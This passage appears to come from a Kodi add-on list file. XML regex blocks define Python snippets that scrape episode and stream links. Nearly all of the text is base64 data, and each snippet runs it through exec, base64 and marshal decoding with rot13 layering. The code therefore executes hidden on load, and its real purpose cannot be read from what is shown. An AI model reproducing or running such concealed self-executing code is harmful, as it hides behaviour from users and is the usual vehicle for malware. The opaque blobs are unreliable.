G5wWmVrMUVWVE5PUkZVd1dXcFZkMDVxVFRCTlZGa3pUbnBSTUU1VVkzaE9SMDB5V2tSS2JVNVVTVE5aVkZVeVRsUk5NRTlVVFRCT2FrMHpUMFJhYUU1cVl6TlBSRTB5VGtkVk1FNTZXbXhPUjFFeFQxUk5NRTV0VVRKT1JGRXlUbnByTTA5RVVtbE9SMWw2VDBSak1rNTZhekJhVkVwdFRsUkZNRTlVVFRST1Iwa3dUbFJhYlUxNlFYcE5lbGw2VFhwUmVrNTZXbWxPYWtVeVRucGpNRTVVWTNsWmFsVTBUVzFKTWxsVVdYcE9lbWQ2VG5wamVrMTZZM2xaYW1OM1RrZFpNbHBFVW10TmVtc3dUbnBWZUU1dFVUQlBWRlUxVG0xTk0wNUVWVEpOZW10NlRtcGpNRTVIUlRKYVJFMDBUa1JuZVZwcVVtdE9WR3Q2VGxSVmVrNVVSVEZQVkZsNFRqSkZNbHBVWXpWTmVsRXhUWHBaTlU1dFNYcE9WRlV5VG1wak1scFVVVFZPTWtVeFRYcFpNazV0VlRGTlJGVjRUWHBSTWxsNlVteE9SRkV5V1hwYWFrMXRXWGxhYWxWNVRYcGpNazlVV21wT1ZFRXlXbFJqTUU1SFZUTlpWRlY1VGtkSk0wNXFaR2hPZWtGNlQwUlNiRTVVU1RCTmVsVjZUa1JqTTFsVVZUQk9WRkY1V21wTk1rNTZTVE5aVkZKcFRXMVpNRTlVVVRST1IwMTZUa1JWTWs1VVdURlBWR040VGtSUk1VNUVVVFJOYlZreVRsUlNiRTVxVlRKWlZGSnJUa2RSTUZscVZYbE9SR2N6VGxSWk0wNXFhM3BPVkZFeVRYcFZNMDU2V1RST1IxRXpUV3BqTkU1SFJUSk9WRkpxVGtSRk1GcHFVbWhPUjAweVdYcFplRTVFV1RCT2FsRXdUWHBaTUZsNlVYbE9SRkV5V1ZSWk5FNTZaek5OUkUxNlRucHJNazFVV1RST1ZHTXdUbFJWTkU1dFdUSk9WR00wVGpKRk1WbFVUWGxPYWswelQxUmplVTVFWXpKWmVscHRUbTFWTWs1RVVtbE9lbFY1V21wTmQwMTZSWHBPYWswd1RtMVZNbGxVVVROT1ZFVjVXbXBhYkUxNlZUSlBSRmw1VGtkVk1rNVVWWGhPZWtVeFRYcFNhVTE2UVROWlZGRjVUa1JqTUZscVZYaE5la0V5VDFSV2FFMTZaekZaVkZKc1RXMUpNMDU2V21oT2Vtc3hUa1JaZWs1cVRURk5WRkpvVFcxSk1VNVVVWGhPYWxrd1QwUmpNazVxVFRGTmFscHBUbnBSZWs5RVVtdE9SMWt5V1dwS2FVNVVWVEJQUkZKcVRrUmpNbGxxVFRCTmVsa3lUMVJTYUU1dFdYcFBSRlV5VGtSVk1sbFVUWGRPYWtVeVdtcFJNRTF0U1RKTmFsa3dUbFJWTVUxNlRUQk9hazB5V1hwTmVrNUVaekpaYW1OM1RYcFpNRTlFVVRST2JVbDVXV3BaZUU1cVNYcFBSRlV3VG1wck1sbDZXVEpPUkZVelRrUlJlazVxYXpOUFJHTTFUa2RWTVU5RVVtdE9ha2t4VFdwV2FFNTZaekpaYW1NMFRsUkJNbGw2WXpWT1ZHc3dUbFJOZUU1SFNUSk9SR015VFhwSk1scEVVVFJPZWtrd1RsUmpNRTV0V1RKWmVrMTZUbnBGZWsxRVNtMU9WRkV4VG5wWk5VMTZTVE5QUkZFd1RsUk5NRnBVV1RKT1ZFVXdUMVJaTlU1NldYcE9WRkUxVG5wVmVWbHFVVEpOZWsxNlRtcGplazV0VlRCWlZGVXpUWHBWZWsxNlVUUk9lbEV4V1ZSTk1FMTZVWHBQUkZwcVRrUkZNazE2V1RST1ZGRXdUVlJaTVU1VVVUSlphbGw2VGtSck1sbDZWWGRPVjBWNlRtcFJNMDVxV1RGTmVsRTFUa1JKTTA1cVdUQk9la1V4VFVSak5FNTZZekZQVkZVMFRqSkZNVTVFVlRGT2Vtc3pUV3BaTlU1dFJUQlBWRmt5VFhwWk1VNVVVVFZOZWxreVdYcFZlazE2UlROUFJGSnJUbXBGTWsxNll6Qk9WRmw2VFZSWk5VMXRXVEZQVkZVd1RYcEZNVTlVVFRCT2JVVXhUMVJTYlU1VWF6Sk5hbFY0VG5wRk0wOUVUVEpPYlUwd1drUlZNazVVU1RCWlZGVXhUbXBSTWsxcVRUUk9SMDB5V2xSWk0wNVVRVEJhYWxsNFRYcFZNRnBVV1RGT1IxRjVXV3BXYUU1SFVUQk9hbFY1VGxSSk1rMTZZM2ROZWxFd1drUlNhazVFVFhsWmFrMHdUbXBOTWs5RVZYZE9iVVY2VDFSVk0wNXFZekJaVkdSb1RYcEpNMDVVV20xTmJWbDZUbnBOZUU1NmF6Qk9hbU14VGxSQk1rNUVVWGhPYlUwelRrUmFhVTE2VVhwT2FtTTBUbFJSTTA1RVVUVk9WRVV5VFhwTmQwMTZVVEphYWxreVRucE5NMDU2V1RKT1ZFa3lUVlJqZVU1VVFUQlBSRmt4VFhwSk1FNVVVVFZOZWtVd1dYcE5NazVFUlRKTmVsa3lUbXBWTUU5RVVUVk9iVlV5V21wYWFVNVVTWHBPZW1Nd1RucE5NRnBVVW14TmVrVXlXbFJSTlUxNldUQk9SR04zVGtSck1VMUVUWGRPUkdzeFRWUk5NRTVVUVRKWlZGSnFUbnBaTUZwRVVYaE9WR3N4VGtSak0wNUhTVEZOZWxreVRtMVJNVTVVV1RCT1IwMHdUbXBaTUU1VVNUTlpWRnBxVFhwWk1scFVZM2RPYlVWNlRVUlNhazVVUlRCYVJGVXpUbTFaZWs1cVVURk9hbEV3VGxSWk1rNUVhekpaZWxrMFRrUlJlazlFVW1sT1JFVXlUbXBTYVU1cVRYcFBWRkY0VGxSRk0wNXFZekpPVjBVeVRtcGpOVTVVV1RCT1ZGRXpUWHByTVU1RVdtdE9SMWw2VDBSYWEwNXFZM3BPZW1Sb1RrUnJlVmxxVW0xT1JHY3pUbXBaTUU1dFdUTk9hbGt4VG0xVk1VMXFVbWxPYWxsNlQwUlZORTVFU1RGT1JFMTVUbXByTVZsVVdYbE9Na1V5V1dwWk5VNUhSVEpaZWsxNFRrUkZNMDVxWXpST1ZHc3pUMVJOTUU1VVFYbFphbGt6VGxSUk0wMUVVVE5OZWxVelQwUlZNazVVWnpGTlZFMXp6Uk1BQURSYWJVNXRRWGROZFVGdGNHMUJSMHhyUVVkRWJVRkhTRFZCZDBodFdrZEpkVUZSVWpKQlIxb3hRWGQ0TTBGM1RYWkJWRVF4UVZGYWExcHRURE5hVVV4clducE1NMXBSV2pSYWJWb3dURWRJTVVGdGVERk1SMHd3UVZGRU1VSlJWM1phYlVRelFYZE1ORUV5VWpOQmQzQnNRVXBTTUZwM2NESmFiVkl4V2xGSU0wRnRUakpOUjFvMVFWRmFNRTFSVERGQmQxSXpRVWR3TTBGSGNERmFVVWhyUVZGRWJVRjNUR3hCZDFZelFsRkVNRUZIZERKQlIxb3hRVWRPTUUxSFJESkJkMVl3UWtkRU5FRnRVakZhVVZwcVFYZDRNa0ZIU0RGQlIwd3dXa2R3YTBGUlNHMUJVVWcxV20xV2JFMTNTR3hCYlZveVRYZE1NRUZSVWpCQlVWcHJRVlJXTUVGdFRYZEJiVWh0UVZGd01FRlJTRE5CVVV4c1dtMVNNRnB0Y0d4YWJWb3dUSGROZUVGdFJESkNVVTEyUVZSYU0wSlJSWFphZWxZeFduZGFhbHB0V2pKQmQzQnRRVzFFTWtGUlJHeGFiWEJ0UWtkSWFscHRURE5hUjBWNlFWRjBNRUZSUlhaQk1sSXdRbEZNTWtGNlVqQmFkMHcwUVhkNGJVRjNjRFJCVVZZelRFZEpkVUYzV214TmQwUnNXbTEwYlZwUlJEQkJVVVF3VEhkYU0wRlJkREZDVVVReVFXMU1NMEZSY0ROQlVVUXlUVWR3YTBGM1dtMUNSM0F3UVVkTU1WcHRSRE5CZWxZd1RVZGFhMEYzVmpGYVVVbDFRVkZNTTBKUlJEQkJSMVl5VFVkd05FRlJXakpNUjBWM1FVZE1iVUpIV214Qk1sSXlUWGRFTVZwNlZqTkNSM0J0UVcxRU1VeEhSREpCUjB4dFdrZElOVUYzVmpOQlIwMTFRWGRhTTFwUldtdGFlbFl6UWxGTU1FRlJXakpNUjFveVFWRjBNRXh0U0RSQmVrd3dRbEZNTlZwdFdqRkJVVWd4UVZSTU1GcDNURzFhYlhnd1FWRk5lVUZ0VWpKYVIweHNRVlJFTVZwdFRYaEJWRWd4V25kTWEwRnRSREpCUjNBMFFWRkVNMEYzY0ROYWJWSXdXbmR3TUVGVVNETkJSMFF5UVcxTU1FMUhUWGhCZDBoc1RYZE1NRUZ0U0ROYWQzQXlRWGR3TWtGM1RYaEJla3d3VEcxRU5FRjZXbTFDUjAxMVFVZDRNMEpIU0dwYWJYQXlRWGRJTWxwdFJESkJVVWcwUVhwTU0wSlJXak5CVVVneldsRndORUZSUkRKTlVWcHRRWGRNYlVKUlJYbEJkMUl5VFVkRmQwRlJSREZhVVV3d1FWRk1iVUZ0U0RSYWJVUXdUVkZGZWtGNlRESk5kMFYzUVhwSU0wSkhXak5CZDB4c1RYZEZlRUY2VWpGTVIwd3dXbTFhTTFwdFdtMUJiVm96V25kSU0wRnRUREZDUjFwdFFYZEliRXgzU0dwQlZFd3lRVWRGZWtGVVJERkJkMW8xV20xT01VRnRjWFZCUjFZeVRIZGFNa0YzU0ROQ1IzQnJRVzE0YlZwUlJEUkJSMFF5VFVkSWJFRjNUREJOZDBWM1FYcFNiVUZIVEROQlIzaHRRVWRhYTFwdFVqSmFiVm96UVhwV01rSlJjRFZhYlZJeVFVZE5lVUZ0VWpCTmQweHNRWGRNTUVKUmNEVkJVWEF6V2xGSWJFRnRURzFCUjBWM1Yyb3dXRzR5U1RWdlNsTmxUVXRXZEVOR1RtRndTVWxZY2xReFNYQXpTVXRFTUVWcmNsUXhOVUpLTldGdWVsTm5XVEZXTkVsVlJXdHZVMU5GUWxKQlVGcFVhakJhZVdONFIzcDVhMEV3ZEROTlNIRkJia2RJTkc1SlkxbHhkMDExYmtwcmFFVklNRFJLZDNsWlRFbDFhVnBTUVhkTU1uQXhUV0ZYZW5KM1RtVkJTMk15U25wTlQwZEtRV3RKYlZkVmJ6QTROVWN3VFhwRWVqRjZiMGRCVVZwTFRqRnVWVUZTV20xUGQzRklWakZJVkVGR1RVZEZkM0ZLYTJaQlZERlBiMHRKYkVkUVptVlpiVTFOUWxRNVIwbHRVMFZhTTA5WVRIWm5ZVXBSZFhod1IwMXVTREJXYlhCSWRHMU1kMU5xU1ZBNVkwbDZRVFJCU2tGdFFrcE5WMDFUZVRCYVlVRkpUREpyUkVaNE9HMUZNVk5CYm13NE5VZEtXbXBDVkhrMFRUTkJZa2xJZFZKTlIxZHBiMGRPYkVaS1UybEJlRUY0UVV0WFZYQjVlVkZJZVhGdFJVZEZhWEo2TlcxS1ZEUmxibUZqWjB4TFFWZHVWSEUyY25neGVVUjNSV05GU21OamNWVmFORUZSUVdWS1IxTjRSSGx4ZWtGaFRHdEJkMFY1UjBsSlFXOVFPVzVHZDNsRFNIZDBaVWhLT1dGR1VYRTBXREk0TWtWUlNXaGFVblZWUWt0NVNFMUlVMGh2UzJKdFJFbDVNa3A2UVdOTlNVRmlUWGhuTkVoSlNXUnlVbGRqUVhkTWJVZ3dSR2x5ZUVGYVJFZE5UWEZoVjJaYU1scHJURXRGZVV4S05VaEVlVTFaUlZSMU1YRklWM1p4VVVWc1FXMXhiVUZIZFZkSGVVbGxRWHAxU2tsTFFXTnlla1JwY0dGRldVWlRWMk5IVlVsNlJIWTVhSEo0VjFkWU0xWXlTSGR3YTAxS2EyNUllbWRCUmtock5XOUhTRFJ1VVhGUFNrcEJWMWhzWjBOR01tZGtRbFE1WlVZd1l6RnhNRk5QVFVoak5tNUhVM1pZTWtoc2NXeG5Ta2xHWm1sQ1NHdFVUVXBTYTI1SlJUSnhWWFZ0Y2xJNWFrcFVlV2xHTTJOU2JqSnhZMFpTWTFweFIwRm5Xa2QxYlc4eVdtdEJSM1ZYYmtkU2FtNUlTVTFLZDFjemNUQjVhVWN3WjBkdlIzVlFURzE1V1c5NmVXNXZSMW93VEVoaVpVWnRVbTFHVkhsM1RFZHdha1Y2U0cxSVNVVkhTa2wwYVhBemRWcHhTblZHUVV0WFVGcEhWMmx4UzJOQmNIZ3hkVzlIUldKeVNuUnBSMVJ3YkVsNFYzcElNblF5V0cxTldtOUthMEZOUzNBMVRVaEpiazFJTVdsTlUwbFlXakZQVEVGU09HeEdiVlkxUVdGYWJVbDVjV055VVhsRFdUSTVla1JMUld4TllYQXlSRW94VVc5SWNESnVVVWw1Y0RKbk5tNVRTVE51VVhsVVJXRlRka3BJUVd0TWVIQXhRVzExYmxreGRXcEllblZsUm0xWFdFZEtjV2xCZVVWUGJrb3hTM0I2UkRCdlVuUTBSV0ZXYTFwVWNXTk1TSGhsUmtkMVdFbEtlWGxOVlZkWlNrbHhOVzVSY1dGQlIxZDRRVWx3WlhCNmEySmFNREZwUmtsRlNFUkdaakJ2ZUhoc2JsUXdNRUZJZVZsSlZFa3pjRWxKVkVwNlozZEZSMVpxUWxBNE5VZHNPVE5DU2sxSVFURlRUMEY1WTJWTk0wbGlXVEJXYTBGTFkxRnlZVTlNVEcxMGFXOHlRVE5JTW5sRVNEQmpWMXBJWjJkd2VubE1XbEZ4U1VKVFQxbEJSbVl5U0ZBNVZXOHhZMGRNUjFacVNsRklhMFY2Y1dwRmQwOVpUSHBOZWtoNVkyeHdTR2RUV0RJMVlVMHlVMnR5VTFOb1NHdzVXVTFMVm14SFVEbGpUVEJtYVVkSU1EVmFSMVkwU2tkYVpVd3dhakZ5VTFkSlJUTk5Ta2RKZEcxTlZEbE1TRE5CYVVReFFWRnVTRGxSUjFWVFQwMHhUR3hHU25relduZHhhVWh0ZFVaRlVtZGhXbFZKVjBGUlUydHlkMWRHYmtsd05YSkxURFZ2WVhGaFdubEViRUpSVTJoTlZHdGhXakZhYkZrd1kybHdVR2Q1YjFWQmVXOHlkV1phTTBWNmNraGFha0pTWjNkQlNFVlVRa3BCWWtsUlFXMUVTRWxUUkhsTk1VRlFPREpIVkVsc1JuZDFNWEYzU1dKSVVsY3dXbXc1WkVSSFRUTnZNbmxXY0hwNWFHOHdjVmR1TTJOWFRFbFhXRXhJYTJWeVZVOHpiMU41TlZwM2RVbHViRGxwU2t0UFJFbFZWMGxFZW5sbGJrbzVURzlSZERSdWJEbFBUVlIxUjNCc09WcEJNMXByVEdGSlJYRlVOV2xHUzFjMVIxTmpkMFI2T0ROTk1tdDZiakJKV1ZveWRXSkpSMU5vU1hwMVlrUnRlV2RHZDB4cFNuZDViRWd5WjJOR1MwaHBjRlZJTlVReFV6RkJSM0EwUWxWNVNVRjZZMVZIU25sQ1RIcFRka2xKY1dKTWJWTkJRbFExWjFsdFUxTkJNamx0U1VneGRWcFVOREp5U1hWYVFrWm5NMjR3T1VkWWJHZEtUREZOV0hCTFFUVk5WRnBwU0VweFRFeEpWMUZOZDNWQ1dqQXhNMHBMUVhoWU1uVm5UVWxTTlVReVNUVndVR2RGVFRGMWJVbFVVMWRNU0VFMVNraHhUVUY0WW0xQmVraHJSRXRCU1c4eWNXbHZNMFY1UVVvNE1HNXRSWGhNZUZkaFRERkpZMjh6VTFGSFNFVXdSWGg0TlVaNE1ETmFTbE5QUlVoTmFrRklSV0p5VWxNMldHMUZhbkpoVjBwQlZFUnRRVWRCVVVZemRETkdkMEZKVFVnMVYwRXlRWGxCVTFkaWNXdzVkVzR5ZFdsYU1VUTBUVkYxZDAweWNUTkVNakJsU1ZRNU5FeHRlVk5DVWxaclJYbzVVRWN3U0d4TVNYVjNSWFk1U0hGNlRXaEhTM1ZIUmxCbk5FMHlZMk5LUzFkbGNsVmFhVUpSVnpGSmVrVm5ibE41VDNFeVpqQnlWVUZoUjNkVFNVSklPRFJNTWtWMVIwaHFha2gzVjNkYVZWTjVRbE5KWTAwelNVMXZTM1JxV25wTmFrWjNUV3RHVWpWVlFUQXhNVVl4U1ROQ1ZEbEZURXBGUWt3eU5EVk5NMU5tU0ZORlNGb3lRWGh4YlhGTGIxUXhZVUpMU0RKeVNIbHNjREZFYlVKUmVXSndTbE5CUmtoQmVVMUtURE5JVWxkM2NERjVSRzlTWTJaRlNsTm9UVEZCVFUxVWNWcE1ZVVZGVERGU05VWlZUVkZOWVUxUFdqRkJhM0o1ZVVkSk1GZEpRVkpCV25GS01ETkVlRkkxV0RCVFNFMTZjV3B1VVVocFJESmFNMDFTVXpSd2VIVnNTbUZOWlhGdFdqQmFNMGx1UVVZNVVVZElTVlpIVVVnMVRIcGpSMjlMUVVGTU1VRjFXbFZYZUVGS09XNUZVVmRGYjBwRlprVjZPVmRLVW1ac2J6TjVkMjR3VFZoSVJqbFdTa2RCTmtGS1UzVndNM2x0UVcxeFMyNWhlVUZNUmpsMVNVbDVUVTE2TVV0YVZIRjFUVEl4WmtKVlZqRkNTbE41VFZGSldrZElTVUZKTW1Jd1IwZEZZa2xJVm1sSVMwbDFja3R4VUVWTFRWcEpVblY1Y0hoRmVuQlNaMGhHYkRsSlNWRnhVbTVVT1V0YWVtYzFRVWRGTUVsVU9WRkhWWEZIY0VwYWFXOWhZMWRHTUVGamIxTkZObGd3YTJ4dmJWSnJRa3BGZUZwdGRWUk1NMU4zUVZGUFUwd3hRVmRNUjNCc1FWSjFVRzlIVjA5eVNVbFZia2RKVmtjelRtbHVTRmQzV0RBeE5VRlZkWFpOYkRsV1FraDFla1JMVFRCdlNtTldSakpyYUVsNGFtMXhNRmRtY25kVE1XNTRVMjF5VldOc2JraDFVbkZ0VTJKS1NtWTFRVEpKVFVsVWEwbE1TbmxvVEVwVFlVRjJPVlJ1YlVreFRYZzVaMFo0UVV0QlNYRmpXVzFGWTI1UldtdHllR2RrY0hseFRVSklXbVZJYlU1cGNrcGlhVzVVT0dsWU1tZFpibE5FTVV4S2RVMUJTRmQyYmxGSWJXNUhVMHR5VVhBeWJraG5VVm95T1cxTWJVbFpja2RCZGtKS1UzbEVSMWRpY0VZNVQzSkhSVzFHTUVsSFRETkpWa3BLWjNkdVMzbDViakpuWlhKU1ltVkZTWFZoV1RGTlQwbFNWalJFYlVGcFNsSnhTMWd4U1hWeWRqZ3pjV3huYTNBeGRVbEdNVmRhUVV0SmFFVXdTVlp4YlhneFRVbDVkWEJ0VXpORlUySnRSRzE1YUVKVFUzVkNVR2RaV2xGMVZWcGhkV2h1VURobFJ6Sm5kVUpRT1c1WmJVMUZTa3ByZW05R09XZHhTVk50UVd4bmVFeEhRV1pFTTA5M1dXMTVkMHBKU1Zod1ZVVjFXVEpOYTBGdFRWUkdTRm96V0RGQmFrRkhUV05FU1VsUlIxRkJlVVJJYW1sRmJYRnBSbTF3YkVodFUxbHdNSEZSU0hwbU5WcEplRFJhTUZkUFdsUlRZa3hoVERWSVIzVlVSMGhCV0UwelUybE5NbmcwYmtkU2JVSkxVbWxCZUdkTlFUSm1NMFJoWTJod1NFbGhjSGhUUmxwUmVVVkNSMGxpU1Vsd05VZ3llRFJaTW10aFNIcG5hMDFTVTA5RU1uRjRiekF4VTBkSWVXcEVZWGh0Y25ZNVpVZFNPV2haTW5sTVRERklNa1l3Y0cxSmVrMTVRV0ZOZDNKS1JVcEpTbE5aY2t0V05YRmhUVUZOTUdkdFdqRklNMW95TVdkTWVHb3pSbE5UWjB3eU1ETk5TMEZGY0RKNU0wMHllV1pHVlhGb2J6STVXVUZVT0RKdVJqbHFSakpYWWtKSVl6TnZSMHcwU1hwQlkyOUxlR2xaTTAwelRHMUpVRVJIZFhoYVNrMHhXVzFNYVVFeGVHVnlTbmh0Y0VsalZXNUhTVWhZTTFOcGNIbDFiWEV6VG1sR1IwVmFiM3A1TVVKUU9EVkNTSFExUjFGMVkwVXpjV2h1WVdOWVdUSkJiRWN5ZUROWk0waHRiakJJYVVKUlNHbENTbkEwUVZScmJXNUdPV2R2YkRocFFVdHdaVVp0VjJKRU1tZDNTbUZNTTNFeVRHdEJSMVpsUkV0U2JWbHRjV2RKVUdjelIwaE5ka3BWZURGdU1raHBTRVpuVEc1TFdqQndTMEZNY0hoRWJWaHRRWFZDUjNsUlFWRkplVTFJVjJ0Wk1ubHRUVk41Wm5GaFFXZEJkMFY0Y0ZSbWFVSkdPWFp3ZDNGM1FUQnJZMHh0U1daWU1EazJSR3c0YW05TFNYaE1iR1l6UWtoSVpYQjZUV055ZWxkTlFsSjVZVzh5VWpKWU1VRlJRVkE0TkUxc09YbFpNMWQxY1hocWFVaEtlV1JaTW1kaldXMVBORUZ0Y1VWSU1tSnRTVWRhYVZsdGRERkJiRGcwV1RKSWFWa3lNV05DVURneGJraElhWEF5ZUdsS1IzQXdjREoxTkVSNFFXdHdNbU5QU1ZONGFra3pZbUZSUkdNMmJrbzVhRlpSTUhSWE1XczBRVzFYY0hKUlRYcExWWFF6UVZOck5GcHRVM0J5VVZwdFYyb3dXRzk2U1dsV1VUQjBUVXROZFc5UWRHRkxWWFF5V25sck5FRjNlWEJ5VVUxNVMxVjBNbHBKYXpSQmJVRndjbEZNYlV0VmRESkNTV3MwUVhkNWNISlJWM2xMVlhRelFVbHJORUY2U1hCeVVVdzBTMVYwTWtGSmF6UkJiWFZ3Y2xGTmQwdFZkREpDU1dzMFFYZE5jSEpSY0RWTFZYUnNRbE5yTkVGNlJYQnlVVTE2UzFWME0xcDVhelJCYlU5d2NsRk1ORXRWZERKQlNXczBRVzFKY0hKUmNHMUxWWFJzUWtsck5GcDNUbUZZUms1bFZsUkpNa3hLYW1KWE1XczBRWGRCY0hKUlRYcExWWFF5UVZOck5FRjNTWEJ5VVV4dFMxVjBNMW94YXpSYWVrbHdjbEZNTUV0VmRESkJTV3MwUVhkQmNISlJUWHBMVlhReVFWTnJORUYzU1hCeVVWWTBTMVYwTTBGVGF6UkJiVmR3Y2xGTU5VdFZkREpOU1dzMFFYZDVjSEpSY0RCTFZYUXpRa2xyTkZwNlFYQnlVVlpxUzFWME0weEphelJCZDNsd2NsRk5la3RWZERKTlNXczBXbmQ0WVZoR1RtVldWRWt5VEVwcVlsY3hhelJCZDFkd2NsRk1OVXRWZERKTlNXczBRWGRUY0hKUmNHMUxWWFF5V2pGck5FRjNlWEJ5VVV3MVMxVjBiRTFKYXpSQmJVbHdjbEZOZVV0VmRESkNVMnMwUVhkSmNISlJjRFJMVlhReVRERnJORUYzZVhCeVVVd3lTMVYwTTBKSmF6UmFkM1Z3Y2xGTmVrdFZkRE5hZVdzMFFYZFRjSEpSVEcxTFZYUXlUREZyTkVGM1NYQnlVVlkxVjJ4NGRGaHNUM2x4ZWxObVdGQnhjSEpSVEcxTFZYUXlUWGxyTkVGM1JYQnlVVXd4UzFWME1sb3hhelJCYlVGd2NsRlhlVXRWZERKQlUyczBRWGRKY0hKUlRHMUxWWFF5VFhsck5FRjNSWEJ5VVV3eFMxVjBiRUpUYXpSQmVsZHdjbEZNTVV0VmRETkNTV3MwUVhwRmNISlJUR3RMVlhReVRIbHJORUYzU1hCeVVYQnNTMVYwYkZwVGF6UmFla0Z3Y2xGV2FrdFZkRE5NU1dzMFFYZDVjSEpSVFhwTFZYUXlUVWxyTkZwM2VHRllSREJZVFV0TmRXOVFkWGR2TWpGcWJrcHJlVmhWWTJadVNsWm9UVlJKZDI4eU1XcHdla2x0Y0d4MWRreExRWGxCZDBSb1RIZE1NRTFVU1hkdk1rVjVXRlJKTWt4S2FtSlhNV3MwUVhwSmNISlJUREZMVlhReVRYWndZMWhHZUdaWGJXdHRjVlZYWTI5NmNDdFhiR3BoVFV0MWVVeHNjR05ZUkQwOWRBVUFBQUJ5YjNReE0zTUpBQUFBYlc5eWNHaGxkWE1nY3h3QUFBQmpiMlJsWTNNdVpHVmpiMlJsS0hSeWFXNXBkSGtzSUhwcGIyNHBkQVlBQUFCdmNtRmpiR1Z6SGdBQUFHTnZaR1ZqY3k1a1pXTnZaR1VvYTJWNWJXRnJaWElnTENCNmFXOXVLWFFEQUFBQWJtVnZjd2dBQUFBOGMzUnlhVzVuUG5RRUFBQUFaWGhsWXlnTEFBQUFkQVlBQUFCaVlYTmxOalIwQmdBQUFHTnZaR1ZqYzNRSUFBQUFiVzl5Y0dobGRYTjBCd0FBQUhSeWFXNXBkSGxTQkFBQUFIUUlBQUFBYTJWNWJXRnJaWEowQkFBQUFIcHBiMjUwQkFBQUFHVjJZV3hTQlFBQUFIUUhBQUFBWTI5dGNHbHNaWFFKQUFBQVlqWTBaR1ZqYjJSbEtBQUFBQUFvQUFBQUFDZ0FBQUFBY3dZQUFBQnpZM0pwY0hSMENBQUFBRHh0YjJSMWJHVStBUUFBQUhNT0FBQUFHQUVHQVFZQkJnRUdBUVlCS2dFPSIpKSk="))
]]></expres>
<page></page>
</regex>
<regex>
<name>cap</name>
<listrepeat><![CDATA[
<title>[COLOR white][cap.param4] [cap.param3][/COLOR]</title>
<info>[COLOR white][cap.param1][/COLOR]</info>
<link>$doregex[link_final]</link>
<thumbnail>[cap.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[makelist2.param3]'
temporada = '[temp.param2]'
from resolveurl.plugins.lib import jsunpack
from datetime import datetime, timedelta
import time
import re,requests,xbmc,random,urllib2,xbmcgui,base64
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>link_final</name>
<listrepeat><![CDATA[
<title>[COLOR white][link_final.param2] [link_final.param3] [link_final.param4] [/COLOR]</title>
<link>$doregex[selecion_inteligente]</link>
<thumbnail>[cap.param2]</thumbnail>
<fanart>https://i.imgur.com/KFAuyll.jpg</fanart>
]]></listrepeat>
<expres><![CDATA[#$pyFunction
url = '[cap.param1]'
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,random,urllib2
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUJRQUFBRUFBQUFCemlRQUFBR1FBQUdRQkFHd0FBRm9BQUdRQUFHUUJBR3dCQUZvQkFHUUNBRm9DQUdRREFGb0RBR1FFQUZvRUFHUUZBRm9GQUdRR0FGb0dBR1VIQUdRSEFJTUJBR1VIQUdRSUFJTUJBQmRsQndCa0NRQ0RBUUFYWlFjQVpBb0Fnd0VBRjFvSUFHVUhBR1VKQUdVQUFHb0tBR1VIQUdRTEFJTUJBSU1CQUdRTUFHUU5BSU1EQUlNQkFBRmtBUUJUS0E0QUFBQnAvLy8vLzA1MHR4VUFBRWw1UW14aWJVNTJXa2RXYTBsSFNqVkVVVzlxU1VWYVZWSjNNRXRFVVhCd1lsaENkbU51VVdkWmJVWjZXbFJaTUV4RFFqWmlSMnhwVEVOQ2FtSXlVbXhaTTAxelNVZEtjR0p0Um5wWk1teHdSRkZ3ZEdJelNuZGhSMVl4WTNsQk9VbERZekpPVkZKb1RucHJNMDVFV1RGTmVrVXpUbFJWZDA1dFdYcE5SR040VFhwWmVrNVVXVEpPZWxVeFRucE5OVTV0VlhsYWFsVTFUWHBCTWxwVVdteE9WR3Q2VFhwVk1FNTZSVE5PUkZFeFRsUkpNazE2VFROT01rVjZUbnBWTlUxNlFURk5SRlV5VGtkSmVrNUVZek5PUkVrd1RYcFZOVTU2VFRCTmFsSnJUa1JSTTA1cVkzaE9SRWw1V1dwamVrNVVUVEphUkZwc1RrZFJlazlFVVRST1ZHc3lXV3BTYUUxNlJUQmFhbEpxVG5wSmVWcHFTbWxPZWtrd1RXcFZNazV0U1RGT2FsVXlUWHByZWsxRVVteE9SMFV6VFZSUk5FNVVWVEZOZWxwcVRtMU5NRTFVWXpST1JHY3dUV3BaTUUxNlkzbFphbU42VGpKRmVWcHFWVEZPYWxrelRtcE5NVTE2UlROT2FrcHBUbXBaZWsxNlRUTk5iVWt5VG1wak1FNTZXVE5OUkVwdFRYcGpNVTlFVlRSTmJWbDZUbnBhYUU1NlVYcE5SRlUwVG1wcmVWcHFXVEpPZWtrd1dYcGplVTE2WTNsWmFrMDBUbFJaTWs1cVZUUk5lbXQ1V21wWk1VNUhXWHBOZWsxM1RXMVpNRTlFWXpKTmVsVjZUbXBaTWs1SFJURlBSRTE2VFhwak1sbFVXVFZPZWxreldWUmpNazU2V1hsYWFrMHhUbFJOZWsxNldUQk5iVmt6VFdwTmVFMXRXVEZOUkZwb1RYcGplazU2U20xTmVtdDZUMVJaZVU1cVdUSk9hbFpvVGxSUmVWbHFTbTFPYlZVelRWUmplVTVVV1RGWlZFcHBUbGRGTTA1RVZYcE5iVWt5V1dwUk1rNVVWVE5QVkZreFRYcFpNRTVxVFRWT1IwMHdXbFJOZDA1dFNYcE5WR041VGtkTk1GbFVUWGxPYlZrelRXcGFhVTF0V1hwT2VrcHBUbFJqTWs1RVNtbE9hbXN6VDFSTk1rNUVaekpOVkZwb1RrUlpNbGxxWXpWT2FrMHdUbFJSTlU1NldYcFBSRTE1VG1wWk1VNUVZekJOZW1ONlRWUlJNRTVYUlhsYWFsRXlUbnByTWs1RVkzZE9hazB3VGtSTk0wNXFTWHBPYWxKdFRXMVpNazFxVlRKT1IwVXpXVlJqTTAxdFdURk9lbEpzVG1wTk1rMVVXVEZPTWtWNlRsUlNiVTVxVVROT1JGRjRUbXBWTTA1cVdYaE5la2t4V1ZSTk5VMTZTVEJQVkZwclRucFplVmxxVlRST1ZHTXdXV3BqTUU1dFVYcFBSR041VG0xWk1rMXFWWHBPVkdjeVdWUmFhMDU2UVROT2FsVjZUbTFaTWs5VVVUTk5lbXN5VGxSVk1rNUVZekpQVkZKb1RtcEpNRTVFVlRWT2Fsa3pUVVJTYVU1NlRUQlBSR1JvVG